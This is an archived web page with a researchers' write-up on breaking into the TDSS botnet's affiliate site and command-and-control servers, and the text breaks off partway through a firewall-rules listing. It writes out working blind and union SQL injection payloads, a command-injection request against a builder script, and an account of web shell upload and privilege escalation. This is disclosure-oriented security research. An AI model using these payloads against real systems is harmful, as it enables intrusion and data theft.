<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html lang="en"><head><script type="text/javascript" async="" src="TDSS%20botnet%20full%20disclosure_files/ga.js"></script><script src="TDSS%20botnet%20full%20disclosure_files/analytics.js" type="text/javascript"></script>
<script type="text/javascript">window.addEventListener('DOMContentLoaded',function(){var v=archive_analytics.values;v.service='wb';v.server_name='wwwb-app223.us.archive.org';v.server_ms=871;archive_analytics.send_pageview({});});</script>
<script type="text/javascript" src="TDSS%20botnet%20full%20disclosure_files/bundle-playback.js" charset="utf-8"></script>
<script type="text/javascript" src="TDSS%20botnet%20full%20disclosure_files/wombat.js" charset="utf-8"></script>
<script>window.RufflePlayer=window.RufflePlayer||{};window.RufflePlayer.config={"autoplay":"on","unmuteOverlay":"hidden"};</script>
<script type="text/javascript" src="TDSS%20botnet%20full%20disclosure_files/ruffle.js"></script>
<script type="text/javascript">
    __wm.pc(0.001);
    __wm.init("https://web.archive.org/web");
  __wm.wombat("http://www.nobunkum.ru:80/analytics/en-tdss-botnet","20180313192821","https://web.archive.org/","web","https://web-static.archive.org/_static/",
	      "1520969301");
</script>
<link rel="stylesheet" type="text/css" href="TDSS%20botnet%20full%20disclosure_files/banner-styles.css">
<link rel="stylesheet" type="text/css" href="TDSS%20botnet%20full%20disclosure_files/iconochive.css">
<!-- End Wayback Rewrite JS Include -->

  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>TDSS botnet: full disclosure</title>
  <!-- base href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/" -->
  <link rel="alternate" type="application/rss+xml" title="Журнал NO BUNKUM — Новости" href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/rss">
  <link rel="stylesheet" type="text/css" href="TDSS%20botnet%20full%20disclosure_files/style.css">
<!--[if lt IE 8]>
<link rel="stylesheet" type="text/css" href="/template/css/ie.css" />
<![endif]-->
<!--[if IE 6]>
<link rel="stylesheet" type="text/css" href="/template/css/ie6.css" />
<![endif]-->
</head>
<body><!-- BEGIN WAYBACK TOOLBAR INSERT -->
<script>__wm.rw(0);</script>
<div id="wm-ipp-base" lang="en" style="display: block; direction: ltr;">
</div><div id="wm-ipp-print">The Wayback Machine - https://web.archive.org/web/20180313192821/http://www.nobunkum.ru:80/analytics/en-tdss-botnet</div>
<script type="text/javascript">//<![CDATA[
__wm.bt(725,27,25,2,"web","http://www.nobunkum.ru/analytics/en-tdss-botnet","20180313192821",1996,"https://web-static.archive.org/_static/",["https://web-static.archive.org/_static/css/banner-styles.css?v=S1zqJCYt","https://web-static.archive.org/_static/css/iconochive.css?v=qtvMKcIJ"], false);
  __wm.rw(1);
//]]></script>
<!-- END WAYBACK TOOLBAR INSERT -->
 
      <div class="subscribe">
        
<form action="/web/20180313192821/http://nobunkum.ru/analytics/en-tdss-botnet" method="post">
<div>
<input class="mail" type="text" name="email" placeholder="newsletter">
<input type="hidden" name="groups[]" value="1">
<input class="submit" type="submit" value="OK"></div>
</form>
      </div>
  <div id="header">
    <div id="title">
      <a id="logo" href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/"><img src="TDSS%20botnet%20full%20disclosure_files/logo.jpg" width="374" height="51" alt="NO BUNKUM"></a>
      <p>...on guns, germs, and steel of the digital age</p>
    </div>
    <div id="subtitle">
      <ul><li class="first"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/lookout/" title="Lookout" class="issue">Lookout</a></li>
<li class="current"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/analytics/" title="Analytics" class="issue">Analytics</a></li>
<li><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/ru/" title="NO BUNKUM" class="issue">NO BUNKUM</a></li>
<li class="last"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/demo/" title="Demo" class="issue">Demo</a></li>
</ul>
      <div class="headerlinks">
        <a id="headerlink-about" href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/about" title="О журнале"><span>?</span></a>
        <a id="headerlink-rss" href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/rss" title="RSS"><span>RSS</span></a>
      </div>
    </div>
  </div>
  <div id="content">
    <div class="aside-long" style="text-align:center;padding:15px 10px">
      <span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=Exploit.SWF.Agent.br">Exploit.SWF.Agent.br</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=Pdfka.asd">Pdfka.asd</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=Pidief.cvl">Pidief.cvl</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight2"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=TDSS">TDSS</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=TDSS+removal">TDSS removal</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=binary+planting">binary planting</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=bios+infection">bios infection</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=blind+sqli">blind sqli</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=bootkit">bootkit</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=bootkit+remover">bootkit remover</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=browser+exploitation">browser exploitation</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=com+hijacking">com hijacking</a></span>
<span class="tl-tag tl-tag-weight4"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=disassembling">disassembling</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=dll+hijacking">dll hijacking</a></span>
<span class="tl-tag tl-tag-weight2"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=drive-by+downloads">drive-by downloads</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=hack+online+banks">hack online banks</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=heap-spray">heap-spray</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=hijack+botnet">hijack botnet</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=ibank">ibank</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=kernel+protection">kernel protection</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=kernel-mode+rootkit">kernel-mode rootkit</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=keylogger">keylogger</a></span>
<span class="tl-tag tl-tag-weight5"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=malware+analysis">malware analysis</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight2"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=rootkit+detection">rootkit detection</a></span>
<span class="tl-tag tl-tag-weight3"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=trojan">trojan</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/tags?tag=virus+removal">virus removal</a></span>
    </div>
    <!-- http://www.nobunkum.org/tdss-botnet/index.html  -->
<div style="margin-top: -10px;">
<h1>TDSS botnet: full disclosure</h1>
<p class="author">Andrey Rassokhin <br>Researcher, Esage Lab<br><a href="https://web.archive.org/web/20180313192821/mailto:andrey@esagelab.com">andrey@esagelab.com</a></p>
<p class="author">Dmitry Oleksyuk <br>Senior researcher, Esage Lab<br><a href="https://web.archive.org/web/20180313192821/mailto:dmitry@esagelab.com">dmitry@esagelab.com</a></p>
<ul class="toc">
<li><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/analytics/en-tdss-botnet#s1">Part 1. Breaking into the botnet</a></li>
<ul>
<li><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/analytics/en-tdss-botnet#s2">Breaking into the partner program</a></li>
<li><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/analytics/en-tdss-botnet#s3">Breaking into C&amp;C </a></li>
<li><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/analytics/en-tdss-botnet#s4">Database</a></li>
<li><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/analytics/en-tdss-botnet#s5">Скрипты</a></li>
<li><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/analytics/en-tdss-botnet#s6">Web shell injection</a></li>
<li><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/analytics/en-tdss-botnet#s7">Elevation of privilege</a></li>
<li><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/analytics/en-tdss-botnet#s8">Botnet administration panel</a></li>
<li><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/analytics/en-tdss-botnet#s9">Changing of C&amp;C servers</a></li>
</ul>
<li><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/analytics/en-tdss-botnet#s10">Part 2. Analysis</a></li>
<ul>
<li><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/analytics/en-tdss-botnet#s11">Database and scripts</a></li>
<div class="aside">
<h4>The article is also available in <a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/ru/tdss-botnet">Russian</a></h4>
</div>
<li><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/analytics/en-tdss-botnet#s12">Requests from bots to the server</a></li>
<li><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/analytics/en-tdss-botnet#s13">Partners accounts</a></li>
<li><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/analytics/en-tdss-botnet#s14">Main botnet table</a></li>
<li><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/analytics/en-tdss-botnet#s15">Bot commands</a></li>
<li><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/analytics/en-tdss-botnet#s16">Payload modules</a></li>
<li><a href="https://web.archive.org/web/20180313192821/http://nobunkum.ru/analytics/en-tdss-botnet#s17">Statistics</a></li>
</ul>
</ul>
<p>TDSS is a wide-spread rootkit which forms a powerful botnet. TDSS is 
studied pretty well today. Howewer, no studies include anything beyond 
analysis of binary code and common attack vectors. Main goal of this 
article is to fill this gap in the IT security knowledge base by 
uncovering the TDSS botnet mechanisms.</p>
<p>Also, we are humbly hoping to benefit to the existing computer crimes
 investigation methodology. This research shows a generic way to locate 
the “digital core” of a cyberband, having only their instrument (a 
malicious binary file). Pease note that this method makes it possible to
 find all technical info about an incident, while personal 
identification and prosecution of intruders remains in law-enforcement 
authorities sphere.</p>
<p>The article consists of two parts. In the first part the process of 
breaking into the botnet is covered step-by-step. The second part is 
dedicated to analysis of the botnet’s inner details. Because we gained 
access to the C&amp;C database, objective statistics of the botnet is 
included at the end of the article.</p>
<h2 id="s1">Breaking into the botnet</h2>
<p>Distribution of the TDSS malware is performed through “Dogma Millions” partner program.</p>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/1.jpg" alt="Home page of dogmamillions.com partner program" width="800" height="498">
<p>Home page of dogmamillions.com partner program</p>
</div>
<p>After registration in the program, a webmaster is encouraged to 
download the TDSS binary file and to distribute it in any possible ways.</p>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/2.jpg" alt="Partner’s account on dogmamillions.com website" width="800" height="447">
<p>Partner’s account on dogmamillions.com website</p>
</div>
<p>Most common way to distribute the binary file is to redirect users to
 landing pages provided by the partner program. A user visiting such 
landing page will be infected by the TDSS. A partnering webmaster is 
rewarded of each successful installation of the rootkit.</p>
<p>User-friendly statistics is available to track infected PCs and 
earnings. Moreover, a webmaster can create separate sub-accounts to 
analyze different traffic campaigns effectiveness.</p>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/3.jpg" alt="Additional account with the link to download of executable TDSS file" width="800" height="447">
<p>Additional account with the link to download of executable TDSS file</p>
</div>
<p>First, the partner program website was analyzed. This allowed us to 
get access to the domamillions.com server’s database and dump webmaster 
statistics. After this we switched to analyzing C&amp;C servers. An SQL 
injection through the bot’s configuration file allowed to read scripts 
on server. After some research we succeeded to inject a web shell 
through one of the vulnerabilities, and finally got root on C&amp;C. 
Let’s go into details.</p>
<h3 id="s2">Breaking into the partner program</h3>
<p>MySQL v5 database was installed on dogmamillions.com server. Thus, 
all requests to database as described below are performed in MySQL query
 language.</p>
<p>First of all, access to the database has been gaine: firstly by means of a <em>Blind SQL injection</em> attack and then by means of a <em>SQL injection</em> attack.</p>
<p>As mentioned earlier, dogmamillions.com users can create subaccounts. They are created by GET HTTP-request:</p>
<pre class="oneliner">http://dogmamillions.com/index.php?request=members.sab_account&amp;create=1</pre>
<p>After performing this request a new subaccount with ID 1 is created 
in partner’s account. It can be deleted by specifying its ID in 
corresponding GET-request:</p>
<pre class="oneliner">http://dogmamillions.com/index.php?request=members.sab_account&amp;delete=1</pre>
<p>Blind SQL Injection attack was performed as follows. It was necessary
 to create subaccount with any ID and then to try to delete it. 
Parameter of delete request was vulnerable, therefore it was possible to
 execute the attack by sending following request to the server:</p>
<pre class="oneliner">http://dogmamillions.com/index.php?request=members.sab_account&amp;delete=if(ord(substring((version()),1,1))&gt;1,1,0xffff)</pre>
<p>If value of <code>ord(substring((version()),1,1))</code> is greater than 1, than <code>if</code> condition returns 1, and request looks as follows (simplified):</p>
<pre class="oneliner">http://dogmamillions.com/index.php?request=members.sab_account&amp;delete=1</pre>
<p>If condition is false, than request will look like:</p>
<pre class="oneliner">http://dogmamillions.com/index.php?request=members.sab_account&amp;delete=0xffff</pre>
<p>So the subaccount will be deleted only if condition of <code>delete</code> parameter is true. Blind SQL Injection attack can be executed using this information.</p>
<p>Another variant of the same attack is possible. <code>create</code> 
parameter of the command for creation of subaccount is also vulnerable. 
Following request will create a subaccount with ID equal to the value of
 first char of the version() command output:</p>
<pre class="oneliner">http://dogmamillions.com/index.php?request=members.sab_account&amp;create=ord(substring((version()),1,1))</pre>
<p>Therefore, if server database version is greater than 5, than first 
symbol of string returned by version() command is “5”. ASCII-code of 
this symbol is 53, so a subaccount with ID 53 will be created in 
partner’s account.</p>
<div class="figure">
<pre>affiliates
	affId
	affAid
	affLogin
	affPassword
	affGroup
	affBalance
	affBalanceEarnings
	affBalancePayout
	affBalanceRefferal
	affBalanceCPV
	affBalanceBonus
	affBalancePenalty
affiliatesaccounts
	affId
	affSid
bonuses
countries
cpvearnings
cronUpdateStatFeeds
	cronId
	cronCreated
	cronStart
	cronCompleted
	cronDateFrom
	cronDateTo
	cronStatus
crontime
domains
	id
	domain
	status
	category
groups
invites
managers
news
payments
paymentsfields
paymentsperiods
paymentsproperties
paymentstypes
penalties
statisticsearnings
statisticsinstalls
statisticsrefferals
substatearnings</pre>
<p>Listing of tables from <code>dogmamillions.com</code>database</p>
</div>
<div class="figure">
<pre>1:Ro<span class="censored">**</span>:c94405aee9b728bad<span class="censored">************</span>b1f
3:over<span class="censored">****</span>:5f4dcc3b5aa765d61<span class="censored">************</span>f99</pre>
<p>First subaccounts from <code>affiliates</code> table of dogmamillions.com<code>dogmamillions.com</code> database</p>
</div>
<div>Exploitation of the described vulnerabilities allowed us to analyze server database of dogmamillions.com.</div>
<h3 id="s3">Breaking into C&amp;C</h3>
<p>As of the time of this analysis, C&amp;C servers of TDSS botnet were 
located at following domains and IPs (fragment of rootkit’s 
configuration file):</p>
<pre>[tdlcmd]
servers=https://d45648675.cn/;https://d92378523.cn/;https://91.212.226.62/
wspservers=http://b11335599.cn/;http://b00882244.cn/
popupservers=http://m3131313.cn/</pre>
<p>Botnet is controlled by three servers specified in <code>servers</code> field of configuration file. So these servers were scanned for vulnerabilities in the first place.</p>
<p>Analysis of bot’s binary file showed that data is being sent to server with the following algorithm:</p>
<ol>
<li>Create data packet;</li>
<li>Encode it with RC4 algorithm, use IP or domain name of target server as a key;</li>
<li>Encode it additionally with Base64 algorithm;</li>
<li>Send data to server.</li>
</ol>
<p>Pseudocode of encoding and decoding algorithms is as follows:</p>
<pre>сhar *encoded_data = base64_encode(rc4_encrypt(data, key));
сhar *decoded_data = rc4_decrypt(base64_decode(data), key);</pre>
<p>In the data which is transmitted to the server by the Trojan, 
vulnerabilities were found which could be used to execute Blind SQL 
injection and SQL Injection attacks.</p>
<p>Particularly, after an incorrect GET request the server returned 
error message with encoded string and full path to vulnerable server 
script inside.</p>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/6.jpg" alt="Error message for incorrect server request" width="800" height="99">
<p>Error message for incorrect server request</p>
</div>
<p>The encoded string decodes to the following command:</p>
<pre class="oneliner">remover|42F831D92B3BE5076B635F2347C80A41|10000|0|DDA|Trojan.Agent|C:\WINDOWS\system32\qo.dll|%SYSDIR%\qo.dll|success</pre>
<p>Exact purpose of this command at the moment of attack was unclear. 
But we could find that the third parameter in spike-divided list is 
vulnerable.</p>
<p>First version of exploit for reading data from database was developed using delay method. Attack query is like follows:</p>
<pre class="oneliner">remover|42F831D92B3BE5076B635F2347C80A41|<strong>if(ord(substring((version()),1,1))&gt;1,sleep(3),1)</strong>|0|DDA|Trojan.Agent|C:\WINDOWS\system32\qo.dll|SYSDIR\qo.dll|success</pre>
<p>This exploit is based on the command which delays database response 
for 3 seconds if successful and makes no delay if failed. This is the 
standard variant of Blind SQL injection delay attack, excepting a fact 
that we have used <code>sleep()</code> instead of <code>benchmark()</code> since it makes no load on DBMS.</p>
<h3 id="s4">Database</h3>
<p>First of all we checked if current user has privileges to read and write server data (<code>File_priv</code>). To find it out, we sent the following query to the server:</p>
<pre class="oneliner">remover|42F831D92B3BE5076B635F2347C80A41|<strong>if(ord(substring((SELECT File_priv FROM mysql.user WHERE (CONCAT_WS(CHAR(64),User,Host) LIKE USER())),1,1))&gt;1,sleep(3),1)</strong>|0|DDA|Trojan.Agent|C:\WINDOWS\system32\qo.dll|SYSDIR\qo.dll|success</pre>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/7.jpg" alt="Result of exploit for Blind SQL Injection with delay" width="677" height="124">
<p>Result of exploit for Blind SQL Injection with delay</p>
</div>
<p>The attack was successful, thus we had the ability to read and write 
files on server. However, since reading files with the previous exploit 
would be very slow, database query was reengineered as follows:</p>
<pre class="oneliner">remover|42F831D92B3BE5076B635F2347C80A41|<strong>if(ord(substring((version()),1,1))&gt;1,1,(select 1 union select 2))</strong>|0|DDA|Trojan.Agent|C:\WINDOWS\system32\qo.dll|SYSDIR\qo.dll|success</pre>
<p>If the condition is true, the new command returns error, and if the condition is false, the command is completed successfully.</p>
<p>The described exploit allowed us to dump the server database and to read script files.</p>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/8.jpg" alt="Работа эксплойта без задержки" width="676" height="450">
<p>Results of exploit with no delay</p>
</div>
<h3 id="s5">Scripts</h3>
<p>Analysis of the file <code>index.php</code> and of scripts included 
in it showed a new vulnerability, which finally allowed us to perform a 
classical SQL Injection attack. Let’s analyze the code of <code>index.php</code> and <code>modules.php</code>:</p>
<div class="figure">
<pre>&lt;?php
try {

...   

    //$_SERVER["REQUEST_URI"]
    $request      = rc4Decrypt( $_SERVER["HTTP_HOST"], base64_decode( substr( $_SERVER["REQUEST_URI"], 1 ) ) ); 
    $requestCount = 0;
    $requestHost = $_SERVER["HTTP_HOST"];

    if( $request ) {
        $request      = explode( '|', $request );
        $requestCount = sizeof( $request );
    } else {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

...

    } elseif( $request[0] == 'module' ) {
        DBase::connect( DBASE_HOST , DBASE_USER , DBASE_PWD , DBASE_BASE );

         
        include( 'modules.php' );
        
        DBase::disconnect();
    } 

...

    } else {
        var_dump($request);
        var_dump( base64_encode( rc4Encrypt($_SERVER["HTTP_HOST"], 'remover|42F831D92B3BE5076B635F2347C80A41|10000|0|DDA|Trojan.Agent|C:\WINDOWS\system32\qo.dll|%SYSDIR%\qo.dll|success') ) );
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
    


} catch( Exception $e ) {
    print $e;
}</pre>
<p>Part of <code>index.php</code> script (omitted code is replaced by dots)</p>
</div>
<div class="figure">
<pre>&lt;?php
require_once( DIR_LIBRARY_MODELS . DS . 'mModules.php' );

    if( preg_match( "%(\d*)!(.*)!%Uis", $request[1], $matches ) ) {
        $modId    = $matches[1];
        $modCrypt = $matches[2];
    } else {
        $modId    = <strong>$request[1]</strong>;
        $modCrypt = FALSE;
    }

    $modDetails = mModules::details( $modId );

    if( $modCrypt ) {
        print rc4Encrypt( $modCrypt, $modDetails['modData'] );
    } else {
        print $modDetails['modData'];
    }
    
    mModules::increment( $modId );</pre>
<p>Vulnerable parameter in <code>modules.php</code> script</p>
</div>
<p>As you can see, the <code>$request[1]</code> value is not validated before usage, so exploitation is possible as follows:</p>
<pre>module|-1 union select 0,1,count(*),3 from users</pre>
<p>Upon processing this command from a bot, the server will print an 
error message containing a valid output from SQL command execution, i.e.
 the amount of records in the <code>users</code> table.</p>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/11.jpg" alt="Testing SQL Injection exploit and server’s response on request" width="800" height="111">
<p>Testing SQL Injection exploit and server’s response on request</p>
</div>
<p>The new exploit made it possible to read files and the database 10 times faster than the previous one.</p>
<p>Our next goal was to inject a shell script into the website, which 
could allow us to execute commands on server without any exploitation.</p>
<h3 id="s6">Web shell injection</h3>
<p>At that point we could easily upload a shell script onto the server 
through one of the script bugs described earlier. But we could not <code>ge acces</code> to the uploaded script, because all web requests to the server were redirected to <code>index.php</code>. So we had to find the HTTP server configuration file, and modify it in order to bypass the limitation.</p>
<p>First, we queried different possible paths to the configuration file 
via the SQL Injection vulnerability. To automate this process, an 
open-source program ‘wfuzz’ was utilized. We had to modify the program 
so that it encoded data prior sending it to the server. Thus the 
necessary configuration file was located at <code>/etc/lighttpd/lighttpd.conf</code>.</p>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/12.jpg" alt="Content of lighttpd.conf" width="553" height="537">
<p>Content of <code>lighttpd.conf</code></p>
</div>
<p>From the configuration file we learned that the redirection was caused by <code>mod_rewrite</code>
 module. The script include-vhost-enabled.pl included configuration 
files for individual virtual servers. Howewer, names of those 
configuration files were obtained by enumeration of files in a given 
directory. Therefore, path to the file which was necessary to solve the 
redirection problem was still unknown.</p>
<p>To find the necessary file, we tested a large list of domain names and IPs inside the TDSS botnet:</p>
<div class="figure">
<pre>/etc/lighttpd/sites-enabled/212.117.162.50.conf
/etc/lighttpd/sites-enabled/212.117.162.1.conf
/etc/lighttpd/sites-enabled/91.212.226.59.conf
/etc/lighttpd/sites-enabled/91.212.226.60.conf
/etc/lighttpd/sites-enabled/91.212.226.61.conf
/etc/lighttpd/sites-enabled/91.212.226.62.conf
/etc/lighttpd/sites-enabled/91.212.226.63.conf
/etc/lighttpd/sites-enabled/91.212.226.64.conf
/etc/lighttpd/sites-enabled/91.212.226.65.conf
/etc/lighttpd/sites-enabled/91.212.226.66.conf
/etc/lighttpd/sites-enabled/91.212.226.67.conf
/etc/lighttpd/sites-enabled/195.24.72.6.conf
/etc/lighttpd/sites-enabled/83.243.8.6.conf
/etc/lighttpd/sites-enabled/server.lu.conf
/etc/lighttpd/sites-enabled/www.server.lu.conf</pre>
<p>Part of the list of possible configuration file paths</p>
</div>
<p>However, only a heuristic manual search lead to success. The necessary configuration file was finally located at <code>/etc/lighttpd/sites-enabled/engine.conf</code>.</p>
<div class="figure">
<pre>$SERVER["socket"] == "91.212.226.63:80" {
        $HTTP["host"] =~ "(.*)?" {
	server.document-root = "/var/www/dm_builder/php/"
#                url.redirect = ( "^/phpmyadmin/(.*)" =&gt; "https://213.133.110.18/phpmyadmin/$1" )
                <strong>url.rewrite-once = ( "^/087dggl094aa/\?aid=(.*)&amp;sid=(.*)$" =&gt; "/MakeBuild.php?aid=$1&amp;sid=$2" )</strong>
		accesslog.filename = "/var/log/lighttpd/build.log"
        }
        server.document-root = "/var/www/dm_builder/php/"
}

$SERVER["socket"] == "212.117.162.50:80" {
        $HTTP["host"] =~ "(.*)?" {
        server.document-root = "/var/www/dm_builder/php/"
#                url.redirect = ( "^/phpmyadmin/(.*)" =&gt; "https://213.133.110.18/phpmyadmin/$1" )
                url.rewrite-once = ( "^/087dggl094aa/\?aid=(.*)&amp;sid=(.*)$" =&gt; "/MakeBuild.php?aid=$1&amp;sid=$2" )
                accesslog.filename = "/var/log/lighttpd/build.log"
        }
        server.document-root = "/var/www/dm_builder/php/"
}

$SERVER["socket"] == "91.212.226.60:443" {
        ssl.engine = "enable"
        ssl.pemfile = "/etc/lighttpd/ssl/chief.pem"
        server.document-root = "/var/www/engine/public"
        server.errorlog = "/var/log/lighttpd/engine_error.log"
        accesslog.filename = "/var/log/lighttpd/engine_access.log"
        <strong>url.rewrite-once = ( "^/(.*)$" =&gt; "/index.php?request=$1" )</strong>
}</pre>
<p>Part of <code>engine.conf</code></p>
</div>
<p>The file engine.conf contained settings for six servers. Only two of them were configured to redirect HTTP requests to <code>index.php</code>. The other servers were configured to redirect HTTPS requests to <code>MakeBuild.php</code>.</p>
<p><code>MakeBuild.php</code> script was designed to compile and 
configure the TDSS rootkit binary. The script receives a number of 
arguments, one of them supplying debug information for the binary.</p>
<div class="figure">
<pre>&lt;?
if (!isset($_GET['aid'])) exit();
$AID=$_GET['aid'];
$SID=$_GET['sid'];
if (empty($SID)) $SID=0;

$DBG=$_GET['dbg'];
$ENC=$_GET['enc'];

/*if ($AID == 20034 || $AID == 20124)
{
	$url = "http://213.133.110.18/03kd7nml094hx09/?aid={$AID}&amp;sid={$SID}";
	if ($ENC) $url .= "&amp;enc={$ENC}";
	if ($DBG) $url .= "&amp;dbg={$DBG}";
	header("HTTP/1.1 302 Found");
	header("Location: {$url}");
	exit();
}*/

$BuildPath="./builds/{$AID}-{$SID}.exe";
$ExitStatus=null;

<strong>if(!chdir('/var/www/builder/')) exit();//exit('Error: Can\'t ChDir'); exec("/usr/bin/wine builder.exe {$AID} {$SID}",$OutPut,$ExitStatus); if ($DBG) { unlink($BuildPath); echo "&lt;html&gt;&lt;pre&gt;\n+------------------------------+\n"; print_r($OutPut); echo "\n=------------------------------=\n"; exit('Builder exit status: '.$ExitStatus); }</strong></pre>
<p>Part of <code>MakeBuild.php</code> script</p>
</div>
<p>As you can see from listing, script arguments are not validated before passing them to the <code>exec()</code> function, so a remote command execution may take place there. Moreover, the <code>dbg</code> parameter allows to print the executed command output.</p>
<p>The following request will to print a listing of all files in current directory:</p>
<pre class="oneliner">http://91.212.226.63/087dggl094aa/MakeBuild.php?aid=;ls;&amp;dbg=1</pre>
<p>We utilized this vulnerability to upload a web shell onto the server.</p>
<h3 id="s7">Elevation of privilege</h3>
<p>We succeeded to gain root privileges on server by exploiting a known <code>sock_sendpage()</code> vulnerability. The existing exploit required to be modified to allow execution in x64 environment.</p>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/16.jpg" alt="/root directory at TDSS command server" width="800" height="353">
<p><code>/root</code> directory at TDSS command server</p>
</div>
<h3 id="s8">Botnet administration panel</h3>
<p>In the same directory with the <code>engine.conf</code> file another configuration file was found, which contained settings for the botnet control panel.</p>
<div class="figure">
<pre>$SERVER["socket"] == "91.212.226.59:443" {
        ssl.engine = "enable"
        ssl.pemfile = "/etc/lighttpd/ssl/chief.pem"
#        $HTTP["host"] =~ "^engineadmin\.com$" {
                server.document-root = "/var/www/engine/tools/public"
                server.errorlog = "/var/log/lighttpd/admin.engine_error.log"
                accesslog.filename = "/var/log/lighttpd/admin.engine_access.log"

                url.rewrite-once = ( "^/([0-9a-zA-Z/]+)/?\??(.*=.*)?$" =&gt; "/index.php?request=$1&amp;$2" )

                $HTTP["url"] =~ "^/" {
                        auth.backend = "htpasswd"
                        auth.backend.htpasswd.userfile = "/etc/lighttpd/htpasswd.engine"
                        auth.require = (
                                "/" =&gt; (
                                        "method" =&gt; "basic",
                                        "realm" =&gt; "Use your credit card number as username, cvv2 as password. Thank you ;)",
                                        "require" =&gt; "valid-user"
                                )
                        )
                }

#        }
}</pre>
<p>Contents of <code>engine_admin.conf</code> file</p>
</div>
<p>As you can see from the file, IP address of the administration panel 
was 91.212.226.59. At first we failed to open it in browser, since our 
IP address was not whitelisted to access the panel. So we had to fix the
 whitelist by modification of firewall rules in the <code>/root/ipt.rules</code> file.</p>
<div class="figure">
<pre>-A INPUT -i lo -j ACCEPT 
-A INPUT -s 66.148.74.126/32 -p tcp -m tcp -m multiport --dports 22,443,80,873,3306 -j ACCEPT 
